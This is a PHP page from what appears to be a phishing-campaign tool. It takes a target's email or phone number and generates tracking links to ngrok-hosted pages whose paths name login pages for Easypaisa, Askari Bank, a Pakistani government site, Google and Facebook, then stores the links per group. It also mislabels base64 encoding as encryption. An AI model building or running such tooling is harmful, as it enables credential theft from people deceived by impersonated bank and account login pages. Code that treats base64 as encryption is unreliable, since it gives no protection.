<?php
session_start();
include '../includes/db.php';

if (!isset($_SESSION['group_id'])) {
    header("Location: dashboard.php");
    exit();
}

$group_id = $_SESSION['group_id'];

$tracking_urls = [
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "https://8671-103-137-24-144.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "https://8671-103-137-24-144.ngrok-free.app/google/googlei.php",
    "https://8671-103-137-24-144.ngrok-free.app/real-Estate-Management-System-main/",
    "https://8671-103-137-24-144.ngrok-free.app/facebook/facebook_login.php",
    "https://8671-103-137-24-144.ngrok-free.app/warZoneCommand/index.php",
    "https://8671-103-137-24-144.ngrok-free.app/hackathon/index.html#about",
    "https://8671-103-137-24-144.ngrok-free.app/eshop2",
    "https://8671-103-137-24-144.ngrok-free.app/stylo_website/welcome_stylo.php"
];

function encrypt_data($data) {
    return base64_encode($data);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $contact = $_POST['contact'];

    foreach ($tracking_urls as $url) {
        $encrypted_contact = encrypt_data($contact);
        $tracking_link = $url . "?id=" . urlencode($encrypted_contact);

        // Store tracking link in the database
        $stmt = $conn->prepare("INSERT INTO tracking_links (group_id, contact, tracking_link) VALUES (?, ?, ?)");
        $stmt->execute([$group_id, $contact, $tracking_link]);
    }

    echo "<div class='alert alert-success'>Tracking links generated successfully.</div>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Email or Phone</title>
    <link rel="stylesheet" href="../assets/bootstrap/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h2>Enter Email or Phone</h2>
        <form method="post">
            <div class="mb-3">
                <label for="contact" class="form-label">Email or Phone</label>
                <input type="text" class="form-control" name="contact" required>
            </div>
            <button type="submit" class="btn btn-primary">Generate Links</button>
        </form>
    </div>
</body>
</html>
